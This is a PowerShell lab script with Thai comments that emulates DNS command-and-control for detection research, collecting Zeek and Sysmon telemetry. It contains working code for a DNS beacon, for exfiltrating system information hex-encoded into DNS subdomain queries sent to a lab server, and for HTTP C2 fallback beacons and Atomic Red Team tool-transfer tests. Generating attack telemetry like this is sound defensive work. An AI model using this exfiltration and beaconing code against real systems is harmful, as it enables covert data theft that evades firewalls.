# c2_dns_win.ps1 - DNS-based C2 / DNS tunneling (Windows)
#
# ทำไมต้องมี scenario นี้:
#   1. DNS คือช่องทาง C2 ที่ firewall แทบไม่เคยปิด แต่เปเปอร์อ้างอิงไม่มี telemetry
#      ชนิดนี้เลย (NetworkConnect ทั้ง dataset 71,017 แถว มี 20 แถว)
#   2. เป็นเคสที่ Zeek กับ Sysmon เสริมกันชัดที่สุด:
#        Zeek dns.log  เห็นชื่อ query ยาว + entropy สูง  แต่ไม่รู้ว่า process ไหน
#        Sysmon ev3    รู้ว่า process ไหน เป็นลูกใคร     แต่ไม่เห็นเนื้อ query
#      -> host/fuse_network.py รวมสองอย่างเข้าด้วยกันได้ที่ระดับ process
#   3. sysmon-config-win.xml ปิด EventID 22 (DnsQuery) ไว้ตั้งใจเพื่อให้ตรงเปเปอร์
#      >>> เราจึงไม่ต้องเปิดมัน เพราะ Zeek ให้เนื้อ DNS แทน <<<
#      นี่คือการแบ่งงานกันระหว่าง host sensor กับ network sensor ตรงๆ
#
# ATT&CK:
#   T1071.004  Application Layer Protocol - DNS      (พฤติกรรม เขียนเอง ดูหมายเหตุ)
#   T1048.003  Exfiltration Over Unencrypted Protocol (พฤติกรรม เขียนเอง)
#   T1132.001  Data Encoding - Standard Encoding      (ART)
#   T1016      System Network Configuration Discovery (ART)
#   T1018      Remote System Discovery                (ART)
#   T1049      System Network Connections Discovery   (ART)
#   T1059.001  PowerShell - Abuse Nslookup            (ART)
#   T1071.001  Application Layer Protocol - Web       (ART)
#   T1105      Ingress Tool Transfer                  (ART)
#
# หมายเหตุเรื่อง T1071.004 / T1048.003:
#   ART ไม่มี Windows test ที่ยืนยันแล้วสำหรับสองตัวนี้ใน atomic_report_win.txt
#   จึงทำพฤติกรรมเองด้วย Resolve-DnsName / nslookup ซึ่งเป็น "การใช้งาน DNS ปกติ
#   ของ Windows" ไม่ใช่ malware routine - ส่งอย่างเดียว ไม่รับคำสั่งกลับมารัน
#   (หลักการเดียวกับ beacon ใน botnet_win.ps1 ดู CLAUDE.md)
#
# ⚠️ ต้องรัน host/dns_server.py ก่อน (UDP 53 ต้องเป็น Administrator)
#    และ host/c2_server.py สำหรับ T1071.001
#
# ⚠️ เลข atomic test ทุกบรรทัดมาจาก atomic_report_win.txt ที่รันบน wintarget จริง
#    ห้ามเว้นว่าง - Atomic() ที่ไม่ระบุเลขจะรัน "ทุก test" ของ technique นั้น
. "$PSScriptRoot\_lib.ps1"
Banner "c2_dns_win"
Setup-Sandbox

$dnsHost = if ($env:DNS_HOST) { $env:DNS_HOST } else { "192.168.56.1" }
$c2Host  = if ($env:C2_HOST)  { $env:C2_HOST }  else { "192.168.56.1" }
$c2Port  = if ($env:C2_PORT)  { $env:C2_PORT }  else { "8080" }
$zone    = if ($env:DNS_ZONE) { $env:DNS_ZONE } else { "exfil.lab.local" }
$work    = "C:\lab_sandbox\dnsc2"
New-Item -ItemType Directory -Path $work -Force | Out-Null

# ---------- Stage 1: DNS / network reconnaissance ----------
Write-Host "[dnsc2] network + DNS recon"
Atomic "T1016" "1,2,4,9"           # มี test 9 = DNS Server Discovery Using nslookup
Atomic "T1018" "1,4,5,8"           # test 8 = Remote System Discovery - nslookup
Atomic "T1049" "1,2,3"             # System Network Connections Discovery

# recon เพิ่มด้วย built-in (spawn process จริง -> ProcessCreate)
nslookup -type=NS $zone $dnsHost 2>&1 | Out-File "$work\ns.txt"
ipconfig /displaydns 2>&1 | Select-Object -First 200 | Out-File "$work\dnscache.txt"
Get-DnsClientServerAddress 2>&1 | Out-File "$work\dnsservers.txt"

# ---------- Stage 2: DNS beacon (จังหวะคงที่) ----------
# ช่วงห่างคงที่ 2 วินาที -> beacon_cv ใน netproc.csv ควรต่ำมาก (< 0.2)
# เทียบกับ svchost ของ OS ที่ query แบบสุ่ม (cv > 0.5)
Write-Host "[dnsc2] DNS beacon -> ${dnsHost} (zone $zone)"
$ok = 0; $fail = 0
for ($i = 1; $i -le 30; $i++) {
    $label = "bk{0:d4}{1}" -f $i, $env:COMPUTERNAME.ToLower()
    try {
        Resolve-DnsName -Name "$label.$zone" -Server $dnsHost -Type A `
            -DnsOnly -QuickTimeout -ErrorAction Stop | Out-Null
        $ok++
    } catch { $fail++ }
    Start-Sleep -Seconds 2
}
Write-Host "[dnsc2] beacon ok=$ok fail=$fail"
if ($ok -eq 0) {
    Write-Host "[!] DNS beacon ไม่ติดเลย - host/dns_server.py เปิดอยู่ไหม? (ต้อง Administrator)"
}

# ---------- Stage 3: DNS exfiltration (encode ลง subdomain) ----------
# พฤติกรรมคลาสสิกของ DNS tunneling: หั่นข้อมูลเป็นชิ้น -> hex -> ทำเป็น label
# label ยาวผิดปกติ + entropy สูง คือสิ่งที่ Zeek dns.log จับได้แต่ Sysmon ไม่เห็น
Write-Host "[dnsc2] DNS exfil"
systeminfo | Out-File "$work\loot.txt"
$bytes = [IO.File]::ReadAllBytes("$work\loot.txt")
$hex = ($bytes | ForEach-Object { $_.ToString("x2") }) -join ""
Write-Host "[dnsc2] ข้อมูล $($bytes.Length) ไบต์ -> hex $($hex.Length) ตัวอักษร"

$chunk = 48          # label ของ DNS ยาวได้สูงสุด 63 ตัวอักษร - เผื่อ prefix ไว้
$sent = 0
for ($p = 0; $p -lt $hex.Length -and $sent -lt 40; $p += $chunk) {
    $len = [Math]::Min($chunk, $hex.Length - $p)
    $part = $hex.Substring($p, $len)
    $name = "{0:d3}{1}.{2}" -f $sent, $part, $zone
    try {
        Resolve-DnsName -Name $name -Server $dnsHost -Type TXT `
            -DnsOnly -QuickTimeout -ErrorAction Stop | Out-Null
    } catch { }
    $sent++
    Start-Sleep -Milliseconds 300
}
Write-Host "[dnsc2] ส่ง $sent chunk ผ่าน TXT query"

# ---------- Stage 4: ART - encoding / protocol / nslookup abuse ----------
Write-Host "[dnsc2] encoding + protocol"
Atomic "T1132.001" "3"             # Data Encoding (windows test เดียวคือเลข 3)
Atomic "T1059.001" "20"            # Abuse Nslookup with DNS Records
Atomic "T1071.001" "1"             # Application Layer Protocol - Web

# ---------- Stage 5: ดึงเครื่องมือเพิ่ม ----------
# ชุดเล็กเพื่อไม่ให้กิน $AtomicTimeout - ชุดเต็มอยู่ใน botnet_win/miner_win
Write-Host "[dnsc2] ingress tool transfer"
Atomic "T1105" "7,9,15"

# ---------- Stage 6: fallback ไป HTTP C2 เมื่อ DNS ล่ม ----------
# มัลแวร์จริงมักมีหลายช่องทาง - ได้ NetworkConnect ที่เทียบกับ DNS ได้ในรอบเดียวกัน
Write-Host "[dnsc2] fallback -> HTTP C2"
for ($i = 1; $i -le 5; $i++) {
    try {
        Invoke-WebRequest -Uri "http://${c2Host}:${c2Port}/beacon?ch=dns&id=$i" `
            -TimeoutSec 2 -UseBasicParsing | Out-Null
    } catch { }
    Start-Sleep -Seconds 1
}

# ---------- Cleanup ----------
# T1105 โหลดไฟล์ลงเครื่อง / T1071.001 ทิ้ง artifact - ไม่ล้างจะค้างข้ามรอบ
Write-Host "[dnsc2] cleanup"
Atomic-Cleanup "T1105" "7,9,15"
Atomic-Cleanup "T1071.001" "1"

Done-Banner "c2_dns_win"
